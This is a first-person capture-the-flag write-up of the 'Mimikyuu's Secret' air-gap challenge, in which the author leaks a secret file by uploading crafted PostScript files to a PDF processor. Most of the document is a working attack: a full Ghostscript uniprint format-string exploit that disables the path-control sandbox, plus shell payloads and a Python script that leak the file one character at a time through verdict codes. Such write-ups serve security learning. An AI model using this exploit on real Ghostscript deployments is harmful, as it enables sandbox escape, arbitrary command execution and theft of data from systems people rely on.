# Level 3 Mimikyuu's Secret
If you came from my `Ghost in the Shell` challenge writeup, welcome back! And if you didn't, do check it out at [Ghost in the Shell](./ghost_in_the_shell.md) as this is a continuation of the previous part.

Once again, this is meant to be a record of my trials and tribulations and some of my thought processes while doing the challenge for me to look back on.

Then, without further do, lets get into the challenge!

---

## Description
```
You've proven code execution on the High-Side. Now prove you can exfiltrate data across the air gap.

Within the High-Side environment, the organisation's internal research notes are stored at:

/home/mimikyu/research/notes/misc/secret.txt

The challenge: the one-way data diode only allows hunt outcome codes to flow back to the Low-Side. No raw data crosses the boundary. You must find a way to smuggle the contents of secret.txt back through the pipeline using only the mechanisms available to you.

Internal pipeline detail:

Between the PDF processor and the hunt outcome, an intermediate JSON result is produced and validated. The validator shares the volume /data/vol_stage/ with the PDF processor.

The intermediate result format is:

{"id": "<fileid>", "status": "<status>", "ttp": ["<ttp>", ...], "reason": "<reason>"}

    1. status must be one of: success, duplicate, fail
    2. ttp is an array of strings (may be empty)
    3. reason is required and non-empty when status is fail


The validator processes .json files that appear in /data/vol_stage/. Results are available via GET /readresults/<fileid> and are consumed on read — deleted after being served once.

Your objective: Extract the contents of secret.txt and exfiltrate it.

Flag: The exact contents of secret.txt. 
```

## Understanding the Validator
This was probably the hardest part of the challenge as the only response we can see is the verdict code that is returned via the output data diode after the data has been processed.

Because this is an air-gapped network, we can't simply:
- Establish a reverse shell
- Read the contents of the file and expect to see it displayed in the output

We need to try to understand as much as possible, the actual processing that is going on in the backend in order to exploit any vulnerability in the system. The challenge description tells us
```plaintext
Between the PDF processor and the hunt outcome, an intermediate JSON result is produced and validated. The validator shares the volume /data/vol_stage/ with the PDF processor.

The intermediate result format is:

{"id": "<fileid>", "status": "<status>", "ttp": ["<ttp>", ...], "reason": "<reason>"}

    1. status must be one of: success, duplicate, fail
    2. ttp is an array of strings (may be empty)
    3. reason is required and non-empty when status is fail


The validator processes .json files that appear in /data/vol_stage/. Results are available via GET /readresults/<fileid> and are consumed on read — deleted after being served once.
```

After spending a long time trying to understand it, I came out with the theory that the PDF processor creates this "intermediate JSON" which is used by the validator processor to determine the response code.

However, I wasn't sure if that really was the case because as I mentioned in the previous writeup, uploading the same PDF file multiple times would return different verdict codes, so it didn't seem like the PDF processor was actually processing anything. Either ways, I could tell that the attack vector, or the object of interest, is this "intermediate JSON" that is created. 

My idea was to manipulate the data inside the "status", "ttp", and "reason" fields of this intermediate JSON and test the returned verdict codes to understand how the validator works.

But we weren't given the name of the JSON file that was created, so how do we know which file to write to?

I thought of using a similar method as I did in the previous challenge, where I used the command `ls <dir> | head -n 1` to get the first file in the directory. But if you remember from the last challenge, `/data/vol_stage` contains a `/secret/` directory, so does that mean this command can't work?

Actually, we can still use this command, but with a slight alteration. 
```bash
ls /data/vol_stage/*.json | head -n 1
```

This updated command will only list `.json` files, ignoring the `/secret/` directory!

Using this command and an updated payload to write to the intermediate JSON
```PostScript
(%pipe%)id=$(ls /data/vol_stage/*.json | head -n 1); fileid=$(basename "$id" ".json"); printf '{"id":"exploit","status":"fail","ttp":[],"reason":""}' > /data/vol_stage/$fileid
```

And uploading the PDF file...got nothing special.

I tested multiple times to confirm but got random verdict codes each time.

I even altered the "status", "ttp" and "reason" fields hoping to get some response that made sense but to no avail.

I turned to consulting LLMs as I was running out of ideas where I found out that there is likely a race condition happening between the PDF processor and my PostScript exploit code.

The LLM suggested an updated payload
```PostScript
(%pipe%F=$(ls /data/processing/*.pdf | head -n 1); ID=$(basename "$F" .pdf); J="/data/vol_stage/$ID.json"; for i in {1..20}; do  printf '{"id":"$ID","status":"success","ttp":[],"reason":"none"}' > "$J"; sleep 0.2; done) (r) file closefile
```

What the new payload does is that it basically overwrites continuously, the intermediate JSON file for 20 times, hoping that the validator processes the intermediate JSON file right after the payload code writes over the intermediate JSON file.

The results were much better, of 5 attempts, 4 of the verdicts were `LOW_CONFIDENCE_LEVEL` while the other one was `HUNT_ENGINE_ERROR`. I genuinely thought that this was it and I had found out how to manipulate the verdict codes.

Using the LLM, I learnt of this technique, which is a form of Blind RCE, known as Side-Channel Exfiltration via a Boolean Oracle. 

- **Side-Channel** here refers to the fact that we cannot see the contents of `/home/mimikyu/research/notes/misc/secret.txt` directly, but we can leak it via an unintended path, that's right, the verdict codes!
- **Boolean Oracle** here refers to a system that answers "Yes" or "No" to a specific question.
- **The Theory**: The theory behind this attack is simply asking the system questions like "is the first character 'A'?", "is the second character '1'?" etc. The system will then return with a "Yes" (LOW_CONFIDENCE_MATCH/CLEAN) or "No" (HUNT_ENGINE_ERROR)

We can test this theory using a payload like this
```PostScript
(%pipe%F=$(ls /data/processing/*.pdf | head -n 1); ID=$(basename "$F" .pdf); J="/data/vol_stage/$ID.json"; C=$(cat /home/mimikyu/research/notes/misc/secret.txt | cut -c1); if [ "$C" = 'A' ]; then S="success"; else S="fail"; fi; for i in {1..20}; do printf '{"id":"%s","status":"%s","ttp":[],"reason":""}' "$ID" "$S" > "$J") (r) closefile
```

Which should evaluate to "No" (`INVESTIGATION_REQUIRED`) as we know that the flag starts with `CSIT{`

On the flip side, changing the 'A' to 'C' should give us "Yes" (`CLEAN`)
```PostScript
(%pipe%F=$(ls /data/processing/*.pdf | head -n 1); ID=$(basename "$F" .pdf); J="/data/vol_stage/$ID.json"; C=$(cat /home/mimikyu/research/notes/misc/secret.txt | cut -c1); if [ "$C" = 'C' ]; then S="success"; else S="fail"; fi; for i in {1..20}; do printf '{"id":"%s","status":"%s","ttp":[],"reason":""}' "$ID" "$S" > "$J") (r) closefile
```

It was really late by then and I was really tired so I got the LLM to generate a bruteforce script for me which didn't work and would prove to be a huge issue later. Anyways I decided to stop there and continue the next day.

Returning with a rested and fresher mind helped me realise that using a loop to continuously write to the intermediate JSON file is not a stable method and that bruteforce script would almost never work.

Interestingly, the payload that was working the previous night, stopped working. I wasn't able to get any form of consistent result no matter what I tried. In hindsight, it was probably because during the day, there were many more people working on the CTF, so the server load was increased, affecting the system's performance and thus making the payload, which has a race condition, much more unreliable.

Anyways, as exasperated as I was, I approached one of the CSIT staff at the C517 Village booth where I got the hint that we can't use `fail` in `status` because we don't know the exact reason that needs to be in the `reason` field of the intermediate JSON. Thus, we need to use `success`. One more key detail is that `success` with no `reason` will return `CLEAN` each time.

Ok, that wasn't the help I was looking for but it does tell me that we must write to the intermediate JSON file with `success` with no `reason` if the boolean check evaluates to true, and then check that the returned verdict is `CLEAN`

With that in mind, I returned to figuring out how to resolve the unstable payload. Eventually, after spending a long time thinking and testing different payloads, it hit me, why does the intermediate JSON file that I write to have to have the same name as the one that the PDF processor is creating? Why can't I just predefine a name for the JSON file that is created by my payload? The only concern I had was if the `/readresults/{fileid}` API uses the filename as the fileid, or the `id` field in the intermediate JSON, or it sees both.

With these three concerns, I had 3 new payloads to test.
Test 1: Predefining only the filename
```PostScript
(%pipe%F=$(ls /data/processing/*.pdf | head -n 1); ID=$(basename "$F" .pdf); C=$(cat /home/mimikyu/research/notes/misc/secret.txt | cut -c1); if [ "$C" = 'C' ]; then S="success"; else S="fail"; fi; printf '{"id":"%s","status":"%s","ttp":[],"reason":""}' "$ID" "$S" > /data/vol_stage/exploit1.json ) (r) closefile
```

Test 2: Predefining only `id` in intermediate JSON
```PostScript
(%pipe%F=$(ls /data/processing/*.pdf | head -n 1); ID=$(basename "$F" .pdf); J="/data/vol_stage/$ID.json"; C=$(cat /home/mimikyu/research/notes/misc/secret.txt | cut -c1); if [ "$C" = 'C' ]; then S="success"; else S="fail"; fi; printf '{"id":"exploit1","status":"%s","ttp":[],"reason":""}' "$ID" "$S" > "$J") (r) closefile
```

Test 3: Defining both filename and `id` in intermediate JSON
```PostScript
(%pipe%C=$(cat /home/mimikyu/research/notes/misc/secret.txt | cut -c1); if [ "$C" = 'C' ]; then S="success"; else S="fail"; fi; printf '{"id":"exploit1","status":"%s","ttp":[],"reason":""}' "$S" > /data/vol_stage/exploit1.json) (r) closefile
```

For each of these "tests", we poll the endpoint `/readresult/exploit1` since we are testing if its possible to create our own endpoint (specifying our own `fileid`) to poll continuously.

Note that in the payload, i used `cut -c1` to extract the first letter of the flag, which we know to be `C`, thus I do a comparison `if [ "$C" = 'C' ]` which should evaluate to true, which in turn writes the status `success` into the intermediate `exploit1.json` file, and when processed by the validator, should return the verdict code `CLEAN`.

And voila, we got the verdict `CLEAN`! I tried a few more times because I couldn't believe that it was true and lo and behold, I got the verdict `CLEAN` each time.

I returned to the AI generated bruteforce script to generate the flag but for some reason I was unable to get a 200 OK response when polling the endpoint.

Time was running out by then as the CTF was coming to a close so I used the bruteforce script created by my friend so that we could collect the hardware badge. Thanks friend <3

Afterwards, I went home and realised that the web application was still up and running, so I ditched the AI generated script and wrote my own one from scratch. After a bit of testing, I managed to get it working! See below for the final script
```Python

import requests
import time
import string
import io


URL = "https://challenge.airgap-dc26.csit-events.sg"
UPLOAD_URL = f"{URL}/upload"
RESULTS_URL = f"{URL}/readresults/"
FILENAME = "stealyourmoney"

wordlist = string.ascii_uppercase + "{-_/}" + string.digits + string.ascii_lowercase


def upload():
    # indexes used to interate through flag and wordlist
    char_pos = 1
    wordlist_index = 0
    FLAG = ""

    # while True:
    PAYLOAD = r"""%!PS-Adobe-3.0 EPSF-3.0
    %%Pages: 1
    %%BoundingBox:   36   36  576  756
    %%LanguageLevel: 1
    %%EndComments
    %%BeginProlog
    %%EndProlog

    % ====== Configuration ======

    % Offset of `gp_file *out` on the stack
    /IdxOutPtr 5 def

    % ====== General Postscript utility functions ======

    % from: https://github.com/scriptituk/pslutils/blob/master/string.ps
    /cat {
        exch
        dup length 2 index length add string
        dup dup 5 2 roll
        copy length exch putinterval
    } bind def

    % from: https://rosettacode.org/wiki/Repeat_a_string#PostScript
    /times {
      dup length dup    % rcount ostring olength olength
      4 3 roll          % ostring olength olength rcount
      mul dup string    % ostring olength flength fstring
      4 1 roll          % fstring ostring olength flength
      1 sub 0 3 1 roll  % fstring ostring 0 olength flength_minus_one 
      {                 % fstring ostring iter
        1 index 3 index % fstring ostring iter ostring fstring
        3 1 roll        % fstring ostring fstring iter ostring
        putinterval     % fstring ostring
      } for
      pop               % fstring
    } def

    % Printing helpers
    /println { print (\012) print } bind def
    /printnumln { =string cvs println } bind def

    % ====== Start of exploit helper code ======

    % Make a new tempfile but only save its path. This gives us a file path to read/write 
    % which will exist as long as this script runs. We don't actually use the file object
    % (hence `pop`) because we're passing the path to uniprint and reopening it ourselves.
    /PathTempFile () (w+) .tempfile pop def

    % Convert hex string "4142DEADBEEF" to padded little-endian byte string <EFBEADDE42410000>
    % <HexStr> str_ptr_to_le_bytes <ByteStringLE>
    /str_ptr_to_le_bytes {
        % Convert hex string argument to Postscript string
        % using <DEADBEEF> notation
        /ArgBytes exch (<) exch (>) cat cat token pop exch pop def

        % Prepare resulting string (`string` fills with zeros)
        /Res 8 string def

        % For every byte in the input
        0 1 ArgBytes length 1 sub {
            /i exch def

            % put byte at index (len(ArgBytes) - 1 - i)
            Res ArgBytes length 1 sub i sub ArgBytes i get put
        } for

        Res % return
    } bind def

    % <StackString> <FmtString> do_uniprint <LeakedData>
    /do_uniprint {
        /FmtString exch def
        /StackString exch def

        % Select uniprint device with our payload
        <<
            /OutputFile PathTempFile
            /OutputDevice /uniprint
            /upColorModel /DeviceCMYKgenerate
            /upRendering /FSCMYK32
            /upOutputFormat /Pcl
            /upOutputWidth 99999
            /upWriteComponentCommands {(x)(x)(x)(x)} % This is required, just put bogus strings
            /upYMoveCommand FmtString
        >>
        setpagedevice
        
        % Manipulate the interpreter to put a recognizable piece of data on the stack
        (%%__) StackString cat .runstring

        % Produce a page with some content to trigger uniprint logic
        newpath 1 1 moveto 1 2 lineto 1 setlinewidth stroke
        showpage

        % Read back the written data
        /InFile PathTempFile (r) file def
        /LeakedData InFile 4096 string readstring pop def
        InFile closefile

        LeakedData % return
    } bind def

    % get_index_of_controllable_stack <Idx>
    /get_index_of_controllable_stack {
        % A recognizable token on the stack to search for
        /SearchToken (ABABABAB) def

        % Construct "1:%lx,2:%lx,3:%lx,...,400:%lx,"
        /FmtString 0 string 1 1 400 { 3 string cvs (:%lx,) cat cat } for def

        SearchToken FmtString do_uniprint

        % Search for ABABABAB => 4241424142414241 (assume LE)
        (4241424142414241) search {
            exch pop
            exch pop
            % <pre> is left

            % Search for latest comma in <pre> to get e.g. `123:` as <post>
            (,) rsearch pop pop pop

            % Search for colon and use <pre> to get `123`
            (:) search pop exch pop exch pop

            % return as int
            cvi
        } {
            (Could not find our data on the stack.. exiting) println
            quit
        } ifelse
    } bind def

    % <StackIdx> <Addr Hex> write_to
    /write_to {
        /AddrHex exch str_ptr_to_le_bytes def % address to write to
        /StackIdx exch def % stack idx to use

        /FmtString StackIdx 1 sub (%x) times (_%ln) cat def

        AddrHex FmtString do_uniprint

        pop % we don't care about formatted data
    } bind def

    % <StackIdx> read_ptr_at <PtrHexStr>
    /read_ptr_at {
        /StackIdx exch def % stack idx to use

        /FmtString StackIdx 1 sub (%x) times (__%lx__) cat def

        () FmtString do_uniprint

        (__) search pop pop pop (__) search pop exch pop exch pop
    } bind def

    % num_bytes <= 9
    % <StackIdx> <PtrHex> <NumBytes> read_dereferenced_bytes_at <ResultAsMultipliedInt>
    /read_dereferenced_bytes_at {
        /NumBytes exch def
        /PtrHex exch def
        /PtrOct PtrHex str_ptr_to_le_bytes def % address to read from
        /StackIdx exch def % stack idx to use

        /FmtString StackIdx 1 sub (%x) times (__%.) NumBytes 1 string cvs cat (s__) cat cat def

        PtrOct FmtString do_uniprint

        /Data exch (__) search pop pop pop (__) search pop exch pop exch pop def

        % Check if we were able to read all bytes
        Data length NumBytes eq {
            % Yes we did! So return the integer conversion of the bytes
            0 % accumulator
            NumBytes 1 sub -1 0 {
                exch % <i> <accum>
                256 mul exch % <accum*256> <i>
                Data exch get % <accum*256 + Data[i]>
                add % <accum*256 + Data[i]>
            } for
        } {
            % We did not read all bytes, add a null byte and recurse on addr+1
            StackIdx 1 PtrHex ptr_add_offset NumBytes 1 sub read_dereferenced_bytes_at
            256 mul
        } ifelse
    } bind def

    % <StackIdx> <AddrHex> read_dereferenced_ptr_at <PtrHexStr>
    /read_dereferenced_ptr_at {
        % Read 6 bytes
        6 read_dereferenced_bytes_at

        % Convert to hex string and return
        16 12 string cvrs
    } bind def

    % <Offset> <PtrHexStr> ptr_add_offset <PtrHexStr>
    /ptr_add_offset {
        /PtrHexStr exch def % hex string pointer
        /Offset exch def % integer to add

        /PtrNum (16#) PtrHexStr cat cvi def

        % base 16, string length 12
        PtrNum Offset add 16 12 string cvrs
    } bind def

    () println

    % ====== Start of exploit logic ======

    % Find out the index of the controllable bytes
    % This is around the 200-300 range but differs per binary/version
    /IdxStackControllable get_index_of_controllable_stack def
    (Found controllable stack region at index: ) print IdxStackControllable printnumln

    % Exploit steps:
    % - `gp_file *out` is at stack index `IdxOutPtr`.
    %
    % - Controllable data is at index `IdxStackControllable`.
    %
    % - We want to find out the address of: 
    %       out->memory->gs_lib_ctx->core->path_control_active
    %   hence we need to dereference and add ofsets a few times
    %
    % - Once we have the address of `path_control_active`, we use
    %   our write primitive to write an integer to its address - 3
    %   such that the most significant bytes (zeros) of that integer
    %   overwrite `path_control_active`, setting it to 0.
    %
    % - Finally, with `path_control_active` disabled, we can use
    %   the built-in (normally sandboxed) `%pipe%` functionality to
    %   run shell commands

    /PtrOut IdxOutPtr read_ptr_at def

    (out: 0x) PtrOut cat println

    % memory is at offset 144 in out
    /PtrOutOffset 144 PtrOut ptr_add_offset def
    /PtrMem IdxStackControllable PtrOutOffset read_dereferenced_ptr_at def

    (out->mem: 0x) PtrMem cat println

    % gs_lib_ctx is at offset 208 in memory
    /PtrMemOffset 208 PtrMem ptr_add_offset def
    /PtrGsLibCtx IdxStackControllable PtrMemOffset read_dereferenced_ptr_at def

    (out->mem->gs_lib_ctx: 0x) PtrGsLibCtx cat println

    % core is at offset 8 in gs_lib_ctx
    /PtrGsLibCtxOffset 8 PtrGsLibCtx ptr_add_offset def
    /PtrCore IdxStackControllable PtrGsLibCtxOffset read_dereferenced_ptr_at def

    (out->mem->gs_lib_ctx->core: 0x) PtrCore cat println

    % path_control_active is at offset 156 in core
    /PtrPathControlActive 156 PtrCore ptr_add_offset def

    (out->mem->gs_lib_ctx->core->path_control_active: 0x) PtrPathControlActive cat println

    % Subtract a bit from the address to make sure we write a null over the field
    /PtrTarget -3 PtrPathControlActive ptr_add_offset def

    % And overwrite it!
    IdxStackControllable PtrTarget write_to

    % And now `path_control_active` == 0, so we can use %pipe%
    % Find the file in /data/processing/ and create the corresponding .pwned file
    % We use a shell loop to extract the ID and touch the file
    % (%pipe%for f in /data/processing/*.pdf; do id=$(basename "$f" .pdf); touch "/data/vol_stage/secret/$id.pwned"; done) (r) file closefile

    % Original (not working) Payload
    %(%pipe%C=$(cat /home/mimikyu/research/notes/misc/secret.txt | cut -c{CHAR_POS}); if [ "$C" = '{CHAR}' ]; then printf '{"id":"stealyourmoney","status":"success","ttp":[],"reason":""}' > /data/vol_stage/stealyourmoney.json; else printf '{"id":"stealyourmoney","status":"fail","ttp":[],"reason":""}' > /data/vol_stage/stealyourmoney.json; fi) (r) file
    
    % New Payload (also not working)
    %(%pipe%)if [ "$(cut -c {CHAR_POS} /home/mimikyu/research/notes/misc/secret.txt" = "{CHAR}" ]; then printf '{"id"="stealyourmoney","status":"success","ttp";[],"reason:""}' > /data/vol_stage/stealyourmoney.json; else printf '{"id"="stealyourmoney","status":"fail","ttp";[],"reason:""}' > /data/vol_stage/stealyourmoney.json; fi) (r) file

    % Working Payload
    (%pipe%if [ "$(cut -c {CHAR_POS} /home/mimikyu/research/notes/misc/secret.txt)" = "{CHAR}" ]; then echo '{"id":"stealyourmoney","status":"success","ttp":[],"reason":""}' > /data/vol_stage/stealyourmoney.json; else echo '{"id":"stealyourmoney","status":"duplicate","ttp":[],"reason":""}' > /data/vol_stage/stealyourmoney.json; fi) (r) file
    quit
    

    %EOF"""

    while not FLAG.endswith("}"):
        try:
            payload_replaced = PAYLOAD.replace("{CHAR_POS}", str(char_pos)).replace(
                "{CHAR}", wordlist[wordlist_index]
            )

            files = {"report": ("exploit.pdf", io.BytesIO(payload_replaced.encode('utf-8')), "application/pdf")}

            # Used https://curlconverter.com to extract headers
            # Under Network Monitor tab in Developer Tools, right click on the POST request and select Copy -> Copy as cURL
            # [*] Don't forget to remove 'Content-Type' header. Let python requests handle the form boundary
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                # 'Accept-Encoding': 'gzip, deflate, br, zstd',
                "Referer": "https://challenge.airgap-dc26.csit-events.sg/",
                "Origin": "https://challenge.airgap-dc26.csit-events.sg",
                "Sec-GPC": "1",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Priority": "u=0",
            }
            # UPLOAD FILE (POST TO /upload)
            res = requests.post(UPLOAD_URL, headers=headers, files=files)
        except Exception as e:
            print(f"Error uploading file: {e}")
            exit(1)

        try:
            print(f"Uploading to {UPLOAD_URL}...")
            print(f"Trying {wordlist[wordlist_index]} at {char_pos}...")
            if res.status_code == 200:
                print("[*] 200 Received. Upload OK")
                # Now we continously poll for the '/readresult' endpoint for the stealyourmoney.json file that was created in out payload
                print(f"Polling at {RESULTS_URL}{FILENAME}")

                attempt = 0
                while True:
                    get_headers = {
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0",
                        "Accept": "*/*",
                        "Referer": "https://challenge.airgap-dc26.csit-events.sg/",
                    }

                    poll_res = requests.get(f"{RESULTS_URL}{FILENAME}", headers=get_headers)

                    if poll_res.status_code == 200:
                        # check if 'code' is 'CLEAN'
                        code = poll_res.json()["code"]
                        if code == "CLEAN":
                            # Correct character found
                            print("[+] Found Char!")
                            FLAG += wordlist[wordlist_index]

                            if wordlist[wordlist_index] == "}":
                                print(f"FLAG: {FLAG}")
                                return

                            print(f"[+] Current Flag: {FLAG}")
                            wordlist_index = 0
                            char_pos += 1
                        else:
                            # Wrong char, goto next char
                            print(
                                f"\n[x] {wordlist[wordlist_index]} at pos {char_pos} is wrong...continuing"
                            )
                            wordlist_index += 1
                        # once 200 received, need to break out of loop to upload file again
                        break

                    elif poll_res.status_code == 404:
                        attempt += 1
                        print("x", end="", flush=True)
                        if attempt > 15:
                            print("\nMax attempts exceeded. Reuploading file...")
                            attempt = 0
                            break
                    else:
                        print(f"[X] unknown status code: {poll_res.status_code}")
                    time.sleep(4)
            else:
                print(f"Status Code: {res.status_code}")
                print(f"Reason: {res.reason}")

        except Exception as e:
            print(f"Error during polling: {e}")
            exit(1)


if __name__ == "__main__":
    upload()
```

To summarise the key points of this script:
- It first generates a character list using python's string module (note that I placed the uppercase characters and special characters at the front as the flag mainly uses uppercase characters)
- Then it replaces the placeholders {CHAR_POS} and {CHAR} with the character position of the flag to read from and the character to compare respectively.
- Next, it uploads the file by sending a POST request to the `/upload` endpoint with the contents of the string converted to binary using python's IO module
- After, it begins to poll (note that I changed the `fileid` from `exploit1` to `stealyourmoney` to ensure there were no conflicts when running the script as this `/data/vol_stage` is a shared volume used by everyone who is doing the CTF) `/readresult/stealyourmoney` for a 200 OK result.
- After I get a 200 OK, I check to see if the returned verdict code is `CLEAN`. If it is, this means that the correct character was found, the script then continues to the next character and resets the character list index to 0. If the verdict is NOT `CLEAN`, then we know that this is not the correct character and move on to the next index in the character list.
- If the verdict is `CLEAN`, the process starts over from step 2, and continues until the last character in the reconstructed flag is `}`.

Key pointers:
- There is a sleep timer of 4 seconds between each poll request so as to not put stress on the server load.
- Sometimes, however, there still is an issue with polling the server so I set a max attempt of 15 times and if a 200 OK response is still not received, I reupload the data and do the polling again.
- There is a need to add the HTTP request headers to satisfy the server's requirements. (A quick and easy method I learnt is to use curlconverter.com to convert the actual request headers)
- I used `echo` instead of `printf` to write to `stealyourmoney.json` because printf was not working well for some reason (possible because of unescaped quotes I'm not too sure).


Eventually, after the bruteforce script finishes running, you will get the flag
```plaintext
CSIT{Y01NK3D_T0P_53KR3T5_FR0M_M1M1KYU}
```


This experience has helped me understand that I cannot fully trust and rely on LLMs are not that good (evident where my script works while theirs doesn't XD).

And thats it! That's how I successfully completed the challenge. If you made it here, I would like to thank you for reading through my failed attempts and many struggles. This is probably my first time working on a scenario based CTF of this level and also my first time doing a Blind RCE attack under time pressure as well because this CTF was ongoing for the duration of DEF CON. All in all, I had a great experienced and felt that I learnt a great deal from this and I hope that you have too! Thank you and see you in my next writeup!
